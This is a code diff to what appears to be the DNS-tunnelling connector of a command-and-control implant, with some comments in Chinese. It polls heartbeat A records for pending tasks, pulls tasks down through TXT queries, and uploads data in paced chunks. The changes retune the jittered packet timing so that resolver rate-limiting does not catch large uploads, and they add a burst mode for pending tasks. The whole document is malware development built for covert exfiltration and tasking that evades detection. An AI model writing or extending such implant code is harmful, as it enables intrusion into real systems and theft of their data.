@@ -460,9 +460,9 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
 
             // Pacing with Jitter (Traffic Shaping):
             // Target: ~15 packets/sec (Avg ~65ms delay).
-            // Range: 50ms - 80ms.
-            // This is faster than the conservative setting but still safe for Cloudflare.
-            ULONG pacing = 50 + (GetTickCount() % 30);
+            // Range: 100ms - 150ms.
+            // Use longer delay to avoid resolver rate-limiting on large uploads.
+            ULONG pacing = 100 + (GetTickCount() % 50);
             ApiWin->Sleep(pacing);
 
             offset += chunk;
@@ -538,10 +538,12 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                 DnsDebugLog("[DNS] HEARTBEAT: no tasks (0.0.0.0)");
                 // 重置 ACK offset 因为没有待下载的任务
                 this->downAckOffset = 0;
+                this->hasPendingTasks = FALSE;
                 return;
             }
-            // 有任务 (e.g. 0.0.0.1)，Fall through to TXT logic below
-            DnsDebugLogf("[DNS] HEARTBEAT: has tasks (IP=%u.%u.%u.%u)", 
+            // 有任务，标记 pending 以触发 burst 模式
+            this->hasPendingTasks = TRUE;
+            DnsDebugLogf("[DNS] HEARTBEAT: has tasks (IP=%u.%u.%u.%u) -> burst mode", 
                          ipBuf[0], ipBuf[1], ipBuf[2], ipBuf[3]);
         } else {
             // A 记录查询失败（可能是丢包或被拦截），稳妥起见，本次跳过 TXT 查询，等待下次重试
@@ -676,8 +678,9 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                     this->downBuf    = NULL;
                     this->downTotal  = 0;
                     this->downFilled = 0;
-                    // 重置 ACK offset，任务下载完成
+                    // 重置 ACK offset 和 pending 状态，任务下载完成
                     this->downAckOffset = 0;
+                    this->hasPendingTasks = FALSE;
                     DnsDebugLogf("[DNS] GET: task ready, size=%lu bytes", finalSize);
                 }
                 return;
